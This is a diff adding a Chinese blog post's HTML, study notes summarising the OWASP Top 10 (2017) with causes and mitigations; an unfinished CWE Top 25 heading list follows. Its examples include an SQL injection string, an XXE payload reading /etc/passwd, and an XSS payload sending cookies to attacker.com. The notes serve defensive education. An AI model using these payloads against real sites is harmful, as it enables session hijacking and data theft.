@@ -1,0 +1,675 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="软件安全 - 05 [软件安全理论] 常见威胁及其应对措施">
+<meta property="og:type" content="article">
+<meta property="og:title" content="软件安全 - 05 [软件安全理论] 常见威胁及其应对措施">
+<meta property="og:url" content="http://zjeff-953.gitee.io/zjeff/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2005%20[%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA]%20%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%E5%8F%8A%E5%85%B6%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/index.html">
+<meta property="og:site_name" content="Jeff&#39;s blog">
+<meta property="og:description" content="软件安全 - 05 [软件安全理论] 常见威胁及其应对措施">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194428.png">
+<meta property="og:image" content="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194442.png">
+<meta property="og:image" content="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194923.png">
+<meta property="article:published_time" content="2021-06-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-19T12:44:24.000Z">
+<meta property="article:author" content="Jeffords zuo">
+<meta property="article:tag" content="标签">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194428.png"><title>软件安全 - 05 [软件安全理论] 常见威胁及其应对措施 | Jeff's blog</title><link ref="canonical" href="http://zjeff-953.gitee.io/zjeff/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2005%20[%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA]%20%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%E5%8F%8A%E5%85%B6%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":5},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Jeff's blog" type="application/atom+xml">
+</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/reading/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">阅读</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-tie"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">软件安全 - 05 [软件安全理论] 常见威胁及其应对措施</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-06-19</span></span></div></header><div class="post-body">
+        <h1 id="软件安全-05-软件安全理论-常见威胁及其应对措施"   >
+          <a href="#软件安全-05-软件安全理论-常见威胁及其应对措施" class="heading-link"><i class="fas fa-link"></i></a>软件安全 - 05 [软件安全理论] 常见威胁及其应对措施</h1>
+      <p>软件安全 - 05 [软件安全理论]常见威胁及其应对措施</p>
+<p>CWE 通用漏洞枚举 TOP 25 </p>
+<p>OWASP 开放式Web应用程序安全项目 TOP 10</p>
+<span id="more"></span>
+
+        <h2 id="1-OWASP-TOP10"   >
+          <a href="#1-OWASP-TOP10" class="heading-link"><i class="fas fa-link"></i></a>1 OWASP TOP10</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/" >官网地址</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf" >中文文档下载地址</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>值得注意的是2017版的修订说明</p>
+<p><img src="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194428.png" alt=""></p>
+<p><img src="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194442.png" alt=""></p>
+
+        <h3 id="1-注入"   >
+          <a href="#1-注入" class="heading-link"><i class="fas fa-link"></i></a>1. 注入</h3>
+      <p>当用户发送不可信地数据到解释器的时候，就可能出现注入漏洞，比如SQL, NoSQL, LDAP注入，解释器可能会将用户发送的恶意数据视为指令或数据库查询，使得用户在没有权限的情况下访问数据，甚至导致用户完全控制服务器。</p>
+<p><strong>漏洞成因：</strong></p>
+<ul>
+<li>用户数据没有被验证，过滤或净化。</li>
+<li>在没有使用context-aware escaping 的情况下，动态询问和非参数化调用被解释器直接使用</li>
+<li>恶意数据被直接使用到对象关系映射(object-relational mapping,ORM）中</li>
+<li>恶意数据被直接使用或拼接到指令上，导致SQL或命令中包含恶意数据</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>使用安全API，参数化的接口或ORM工具</li>
+<li>使用输入字符的白名单，并不是很好用</li>
+<li>对特定的解释器，转义所有特殊字符。当数据库中表名包含特殊字符时不好用。</li>
+<li>使用 LIMIT等语句避免泄漏大量数据</li>
+</ul>
+<p><strong>例子</strong></p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String query = <span class="string">&quot;SELECT * FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="string">&quot;id&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>; </span><br></pre></td></tr></table></div></figure>
+<p>当我们的参数为<code>id=&#39;or&#39;1&#39;=&#39;1</code>，就会导致用户获得整个表</p>
+
+        <h3 id="2-失效身份验证和会话管理"   >
+          <a href="#2-失效身份验证和会话管理" class="heading-link"><i class="fas fa-link"></i></a>2.失效身份验证和会话管理</h3>
+      <p>应用中负责认证和会话管理的部分没有正确实现，使得攻击者得以泄露密码，口令或令牌，进而可能获取其他用户的身份。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>允许自动化的攻击，如凭据填充（credential stuffing,撞库）攻击。</li>
+<li>允许爆破等攻击</li>
+<li>允许默认，弱，广为人知的密码</li>
+<li>使用弱，或无效的凭据恢复和忘记密码策略</li>
+<li>使用明文，加密或弱hash的密码</li>
+<li>使用损坏的或无效的多因子认证</li>
+<li>在URL中暴露会话ID</li>
+<li>在成功登录后没有轮换会话ID</li>
+<li>没有及时把会话ID，验证令牌等信息无效化。</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>实现多因子认证以组织自动化攻击和凭据重用。</li>
+<li>避免使用默认密码</li>
+<li>进行弱密码检查</li>
+<li>对齐密码长度，复杂度</li>
+<li>确保注册，凭据恢复和API被加固以抵御账户枚举攻击</li>
+<li>限制或延迟失败的登录尝试，并记录所有失败尝试并在发动攻击时报警</li>
+<li>使用服务端，安全，内置的会话管理，确保对于每次登录生成随机会话ID。会话ID不应该在URL中，且应该及时销毁。</li>
+</ul>
+<p><strong>例子</strong><br>用户登陆后没有退出，而是关掉了浏览器，只要使用相同的浏览器，且会话没有及时销毁，就能访问。</p>
+
+        <h3 id="3-敏感信息泄露"   >
+          <a href="#3-敏感信息泄露" class="heading-link"><i class="fas fa-link"></i></a>3.敏感信息泄露</h3>
+      <p>许多web应用和API没有很好地保护隐私数据，比如金融，医疗。攻击者可以偷取或修改这些数据，从而进行信用卡诈骗，身份窃取等。敏感数据在传输过程中应当使用额外的安全措施以避免泄露。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>数据明文传输</li>
+<li>数据明文存储</li>
+<li>使用弱密码算法</li>
+<li>使用默认密钥，弱密钥，重用密钥</li>
+<li>没有强制使用安全措施</li>
+<li>用户终端没有验证接收到的服务器凭据是否有效</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>分类数据，确认哪些数据是敏感的</li>
+<li>按照分类控制数据</li>
+<li>尽量不存储敏感数据</li>
+<li>确保加密所有存储的敏感数据</li>
+<li>确保使用强的加密算法，使用合适的密钥管理</li>
+<li>确保传输的敏感信息加密</li>
+<li>包含敏感数据的响应不缓存</li>
+<li>使用强的，加盐的hash函数存储密码</li>
+<li>独立验证配置的有效性</li>
+</ul>
+<p><strong>例子</strong><br>攻击者将链接从https降为http，拦截用户发送的包，偷取其中cookie，进行重放攻击，劫持会话，从而获取用户隐私信息。他们也可以直接修改传输的包中的数据。</p>
+
+        <h3 id="4-XML外部实体注入攻击（XXE）"   >
+          <a href="#4-XML外部实体注入攻击（XXE）" class="heading-link"><i class="fas fa-link"></i></a>4.XML外部实体注入攻击（XXE）</h3>
+      <p>许多老版本或弱配置的XML解析器在处理XML文件内的外部实体时，会去运行其中的代码。外部实体可以使用文件URI关闭系统内部正在运行的文件，导致无法提供功能。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>应用接受XML或XML上传，或向XML中插入了不可信数据。</li>
+<li>XML解析器或基于SOAP的服务器启用了DTD(Document Type Definition,文档类型定义)</li>
+<li>SAML（安全断言标记语言，基于XML的身份验证）被用于实体处理。</li>
+<li>使用1.2版本之前的SOAP，它可能易受XXE攻击，如果XLM被直接传给SOAP的话。</li>
+<li>易受XXE攻击的服务器会受到billion laughs attack之类的DoS攻击。</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>只要有可能，使用JSON之类的简单数据格式，不序列化敏感数据。</li>
+<li>及时打补丁，升级XML解释器以及使用的库。使用Dependency-check之类的工具。升级SOAP到1.2及更高</li>
+<li>在解析器中禁用XML外部实体和DTD</li>
+<li>使用服务端输入白名单，过滤，格式化来避免XML文件中的恶意数据</li>
+<li>验证XML和XSL文件上传功能中是否使用XSD（XML Schema Definition）及类似的验证功能</li>
+<li>SAST工具能够帮助检测源码中的XXE</li>
+<li>使用虚拟补丁，API安全网关，WAF等手段</li>
+</ul>
+<p><strong>例子</strong></p>
+<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span> 1234</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="5-失效访问控制"   >
+          <a href="#5-失效访问控制" class="heading-link"><i class="fas fa-link"></i></a>5.失效访问控制</h3>
+      <p>认证用户权限的限制往往没有比较好地配置，这导致攻击者能够利用这些缺陷访问未授权的功能和数据。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>通过修改URL，内部应用状态，HTML页面绕过访问控制检查</li>
+<li>允许查看和编辑其他用户的账号</li>
+<li>提权。</li>
+<li>元数据操纵，比如重放或伪造JWT token, cookie或隐藏的用于提权的域，或破坏JWT无效机制</li>
+<li>CORS(Cross-Origin Resource Sharing)错误配置允许未授权的API访问</li>
+<li>强制浏览未授权的页面，API没有进行访问控制</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>除了公共资源外，默认禁止访问</li>
+<li>实现访问控制机制并在系统内到处重用，最小化CORS使用</li>
+<li>模型访问控制应该强制记录拥有权，而不是用户都能增删改查每一条记录</li>
+<li>禁止列出WEB服务器目录，确保元数据和备份文件不在根目录</li>
+<li>记录访问控制失效，合适时警告管理员</li>
+<li>限制访问API的频率，最小化自动攻击工具的损害</li>
+<li>JWT token应该在登出后立刻失效</li>
+</ul>
+<p><strong>例子</strong></p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pstmt.setString(<span class="number">1</span>, request.getParameter(<span class="string">&quot;acct&quot;</span>)); </span><br><span class="line">ResultSet results = pstmt.executeQuery( ); </span><br></pre></td></tr></table></div></figure>
+<p>攻击者只需要在浏览器中将acct修改为任意用户名即可实现攻击</p>
+
+        <h3 id="6-安全性错误配置"   >
+          <a href="#6-安全性错误配置" class="heading-link"><i class="fas fa-link"></i></a>6.安全性错误配置</h3>
+      <p>安全性错误配置是一种非常常见的问题，网站管理员往往会保留默认配置，这导致了很多安全性问题。系统，应用，框架，库不止应该被安全地配置，他们还应该被及时更新。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>在应用栈中任意一处没有安全加固，云服务器授权没有正确配置</li>
+<li>非必要的特性被启用或安装</li>
+<li>默认账户和密码没有改变</li>
+<li>错误处理泄露出了栈追踪，或其他包含信息过多的错误消息被泄露给了用户</li>
+<li>可升级的系统中最新的安全特性没有被启用或正确配置</li>
+<li>应用服务器，应用框架，库，数据库中的安全设置没有被设为安全值。</li>
+<li>服务器没有发送安全头或指令，或是他们呢没有被正确设置</li>
+<li>软件过时了，易受攻击</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>可重复的加固程序，能够更快，更容易地部署环境。确保开发，QA,生产环境配置完全相同，但使用不同的凭据。这个程序应该自动化，以最小化安装安全环境地代价。</li>
+<li>最小的平台，不包含任何非必须地特性，组件，文档。</li>
+<li>包管理工具中检查并更新安全配置</li>
+<li>分段应用结构，使用分段，容器化，云安全组等手段分开组件和用户。</li>
+<li>发送安全指令到客户端</li>
+<li>使用自动化进程以验证所有环境中配置的有效性</li>
+</ul>
+<p><strong>例子</strong><br>应用服务器中带有案例应用。这些应用中带有攻击者已知的安全漏洞，如果其中一个是admin命令行，默认账号没有修改，攻击者就可以控制服务器。</p>
+
+        <h3 id="7-Cross-Site-Scripting-XSS"   >
+          <a href="#7-Cross-Site-Scripting-XSS" class="heading-link"><i class="fas fa-link"></i></a>7.Cross-Site-Scripting(XSS)</h3>
+      <p>XSS漏洞出现在当web页面包含不可信的数据，却没有合适的验证手段来找到它的时候。XSS使得攻击者能够在受害者的浏览器中执行脚本，从而劫持会话，或重定向到恶意站点。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>反射型XSS：应用或API包括未验证的或非转义的用户输入作为HTML的输出的一部分。成功的攻击能够使得攻击者在受害者的浏览器上执行任意HTML和JavaScript。</li>
+<li>存储型XSS：应用或API存储未格式化的用户输入，且该输入之后会被其他用户或管理员浏览到。</li>
+<li>DOM XSS：动态包含攻击者可控制数据到页面中的JavaScript框架， 单页应用，API易受DOM XSS。</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>使用自动转义XSS的框架，比如React JS。学习每种框架的XSS保护，并手动处理用例没有覆盖到的部分。</li>
+<li>转义不可信的HTTP请求数据能够解决反射型和存储型XSS威胁。</li>
+<li>在客户端修改浏览器文档时应用内容敏感的编码以抵御DOM XSS。或使用相似的内容敏感转义技术。</li>
+<li>启用CSP(Content Security Policy),这是一种对抗XSS的纵深防御弥补控制。</li>
+</ul>
+<p><strong>例子</strong></p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(String) page += <span class="string">&quot;&lt;input name=&#x27;creditcard&#x27; type=&#x27;TEXT&#x27; value=&#x27;&quot;</span> + request.getParameter(<span class="string">&quot;CC&quot;</span>) + <span class="string">&quot;&#x27;&gt;&quot;</span>; </span><br></pre></td></tr></table></div></figure>
+<p>攻击者只要将CC参数修改为</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location= <span class="string">&#x27;http://www.attacker.com/cgi-bin/cookie.cgi? foo=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;. </span><br></pre></td></tr></table></div></figure>
+<p>就会使得受害者的cookie被发送到攻击者的网站，进而劫持会话。</p>
+
+        <h3 id="8-不安全的反序列化"   >
+          <a href="#8-不安全的反序列化" class="heading-link"><i class="fas fa-link"></i></a>8.不安全的反序列化</h3>
+      <p>不安全的反序列化经常会导致远程代码执行。也能用于进行重放攻击，注入攻击，提权攻击。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/fa912ce0426f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation" >https://www.jianshu.com/p/fa912ce0426f?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>对象和数据结构相关攻击：当存在类能够在反序列化过程中或是之后改变应用表现，攻击者就能通过这个类修改应用逻辑，或实现任意远程代码执行。</li>
+<li>典型数据篡改攻击：如访问控制相关攻击，当数据结构存在而内容又能被修改。</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<p>唯一的安全模式是不接受来自不可信的参与者的序列化对象。如果不得不接受，使用以下策略：</p>
+<ul>
+<li>对任何序列化对象进行完整性检测，比如数字签名以防止数据篡改或恶意对象。</li>
+<li>在反序列化过程中强制严格的类型限制。</li>
+<li>在低权限环境中独立运行反序列化代码</li>
+<li>记录反序列化异常和错误，比如收到的类型并不是期望的类型。</li>
+<li>限制或监管入的和出的来自反序列化的容器或服务器的网络链接</li>
+<li>监管反序列化，当用户一直反序列化时报警。</li>
+<li>JWT</li>
+</ul>
+<p><strong>例子</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;</span><br><span class="line">i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
+<p>若某站点使用如上图数据结构保存cookie，攻击者可以将cookie修改为下图形式</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;</span><br><span class="line">i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
+<p>如果Alice是管理员，且密码为攻击者命中，攻击者就会得到管理员权限。</p>
+
+        <h3 id="9-使用具有已知漏洞的组件"   >
+          <a href="#9-使用具有已知漏洞的组件" class="heading-link"><i class="fas fa-link"></i></a>9.使用具有已知漏洞的组件</h3>
+      <p>库，框架等软件组件和应用有着相同的权限。如果存在有漏洞的组件，那么攻击就能够导致数据泄露甚至控制服务器。组件中的漏洞会导致整个应用和API安全性的下降。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>管理员不知道使用的所有组件的版本，包括直接使用的和嵌套的</li>
+<li>软件易受攻击，不再支持，或是过时了。包括OS, web服务器，DBMS，APIs和所有组件，运行时环境，库。</li>
+<li>没有周期性扫描漏洞，没有关注所使用组件的安全公告。</li>
+<li>没有及时修复或升级平台，框架，依赖。</li>
+<li>软件开发者没有测试升级，更新，补丁的兼容性</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>移除不再使用的依赖，不必须的特性，组件，文件，文档</li>
+<li>持续地列出目前之用的组件和依赖地版本，使用诸如DependencyCheck 之类的工具。持续关注CVE, NVD上的关于对应组件的漏洞。使用SCA(software composition analysis)自动化这个过程，订阅关于所使用组件的邮件通知。</li>
+<li>只从官方来源得到组件，签名的包更好。</li>
+<li>关注不再维护的库和组件，如果打补丁不再可能，考虑部署虚拟补丁。</li>
+</ul>
+<p><strong>例子</strong><br>大部分IoT设备很难被打补丁。</p>
+
+        <h3 id="10-日志记录和监控不足"   >
+          <a href="#10-日志记录和监控不足" class="heading-link"><i class="fas fa-link"></i></a>10.日志记录和监控不足</h3>
+      <p>日志和监控不足，再加上缺失或无效的事件响应，允许攻击者进一步攻击系统，他可以转向更多系统，进行篡改，提取，销毁数据。大部分研究表明违反往往会在超过200天后才被检测出来，而且还是由外部参与者检测到的。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>可审计的事件，比如登录，登录失败没有被记录。</li>
+<li>警告和错误没有产生足够的，清晰的日志消息</li>
+<li>应用和API关于可疑活动的日志没有被监管。</li>
+<li>日志只本地存储</li>
+<li>没有设置合适的警告阈值和响应升级流程</li>
+<li>渗透测试和扫描工具没有触发警告。</li>
+<li>应用无法实时检测，或对攻击做出警告</li>
+</ul>
+<p><strong>避免方法</strong></p>
+<ul>
+<li>确保登录，访问控制失败，服务断输入验证失败等事件会被日志记录，同时记录足够多的用户上下文以确定可疑账号。保存足够长的时间以用于分析。</li>
+<li>确保日志以一定格式生成，便于日志管理。</li>
+<li>确保高额转账带有审计跟踪和完整性控制以避免篡改或删除</li>
+<li>建立有效的监管和报警机制，使得可疑活动被及时检测和响应。</li>
+<li>建立事件响应和恢复计划。</li>
+</ul>
+<p><strong>例子</strong><br>攻击者用常用密码撞库，每个账户只登录失败一次，如果没有合适的报警机制就会忽视。<br>恶意软件检测沙盒报警了很多次确没有引起重视，最后因为盗刷银行卡被察觉。</p>
+
+        <h2 id="2-CWE-TOP-25"   >
+          <a href="#2-CWE-TOP-25" class="heading-link"><i class="fas fa-link"></i></a>2 CWE TOP-25</h2>
+      <p><img src="https://gitee.com/zjeff-953/picsBed/raw/master/image/20210619194923.png" alt=""></p>
+
+        <h3 id="1-跨站点脚本攻击-XXS"   >
+          <a href="#1-跨站点脚本攻击-XXS" class="heading-link"><i class="fas fa-link"></i></a>1. 跨站点脚本攻击( XXS)</h3>
+      
+        <h3 id="2-越界写入"   >
+          <a href="#2-越界写入" class="heading-link"><i class="fas fa-link"></i></a>2. 越界写入</h3>
+      
+        <h3 id="3-输入验证不当"   >
+          <a href="#3-输入验证不当" class="heading-link"><i class="fas fa-link"></i></a>3. 输入验证不当</h3>
+      
+        <h3 id="4-越界读出"   >
+          <a href="#4-越界读出" class="heading-link"><i class="fas fa-link"></i></a>4. 越界读出</h3>
+      
+        <h3 id="5-内存缓冲区内操作的不当限制"   >
+          <a href="#5-内存缓冲区内操作的不当限制" class="heading-link"><i class="fas fa-link"></i></a>5. 内存缓冲区内操作的不当限制</h3>
+      
+        <h3 id="6-数据库注入"   >
+          <a href="#6-数据库注入" class="heading-link"><i class="fas fa-link"></i></a>6. 数据库注入</h3>
+      
+        <h3 id="7-向未经授权的参与者暴露敏感信息"   >
+          <a href="#7-向未经授权的参与者暴露敏感信息" class="heading-link"><i class="fas fa-link"></i></a>7. 向未经授权的参与者暴露敏感信息</h3>
+      
+        <h3 id="8-释放内存后使用"   >
+          <a href="#8-释放内存后使用" class="heading-link"><i class="fas fa-link"></i></a>8. 释放内存后使用</h3>
+      
+        <h3 id="9-跨站点请求伪造-（CSRF）"   >
+          <a href="#9-跨站点请求伪造-（CSRF）" class="heading-link"><i class="fas fa-link"></i></a>9. 跨站点请求伪造 （CSRF）</h3>
+      
+        <h3 id="10-操作系统命令注入"   >
+          <a href="#10-操作系统命令注入" class="heading-link"><i class="fas fa-link"></i></a>10. 操作系统命令注入</h3>
+      
+        <h3 id="11-整数类型的溢出和环绕"   >
+          <a href="#11-整数类型的溢出和环绕" class="heading-link"><i class="fas fa-link"></i></a>11. 整数类型的溢出和环绕</h3>
+      
+        <h3 id="12-对受限目录的路径名限制不当"   >
+          <a href="#12-对受限目录的路径名限制不当" class="heading-link"><i class="fas fa-link"></i></a>12. 对受限目录的路径名限制不当</h3>
+      
+        <h3 id="13-空指针解除引用"   >
+          <a href="#13-空指针解除引用" class="heading-link"><i class="fas fa-link"></i></a>13. 空指针解除引用</h3>
+      
+        <h3 id="14-不正确的身份验证"   >
+          <a href="#14-不正确的身份验证" class="heading-link"><i class="fas fa-link"></i></a>14. 不正确的身份验证</h3>
+      
+        <h3 id="15-不受限制的上传危险类型的文件"   >
+          <a href="#15-不受限制的上传危险类型的文件" class="heading-link"><i class="fas fa-link"></i></a>15.不受限制的上传危险类型的文件</h3>
+      
+        <h3 id="16-对关键资源的访问权限分配不当"   >
+          <a href="#16-对关键资源的访问权限分配不当" class="heading-link"><i class="fas fa-link"></i></a>16.对关键资源的访问权限分配不当</h3>
+      
+        <h3 id="17-代码注入"   >
+          <a href="#17-代码注入" class="heading-link"><i class="fas fa-link"></i></a>17.代码注入</h3>
+      
+        <h3 id="18-对用户凭证的保护不足"   >
+          <a href="#18-对用户凭证的保护不足" class="heading-link"><i class="fas fa-link"></i></a>18.对用户凭证的保护不足</h3>
+      
+        <h3 id="19-对-XML-中包含的外部实体限制不当"   >
+          <a href="#19-对-XML-中包含的外部实体限制不当" class="heading-link"><i class="fas fa-link"></i></a>19.对 XML 中包含的外部实体限制不当</h3>
+      
+        <h3 id="20-硬编码的用户凭证"   >
+          <a href="#20-硬编码的用户凭证" class="heading-link"><i class="fas fa-link"></i></a>20.硬编码的用户凭证</h3>
+      
+        <h3 id="21-不受信任数据的反序列化"   >
+          <a href="#21-不受信任数据的反序列化" class="heading-link"><i class="fas fa-link"></i></a>21.不受信任数据的反序列化</h3>
+      
+        <h3 id="22-权限管理不当"   >
+          <a href="#22-权限管理不当" class="heading-link"><i class="fas fa-link"></i></a>22.权限管理不当</h3>
+      
+        <h3 id="23-资源分配耗尽"   >
+          <a href="#23-资源分配耗尽" class="heading-link"><i class="fas fa-link"></i></a>23.资源分配耗尽</h3>
+      
+        <h3 id="24-对重要的功能没有进行权限认证"   >
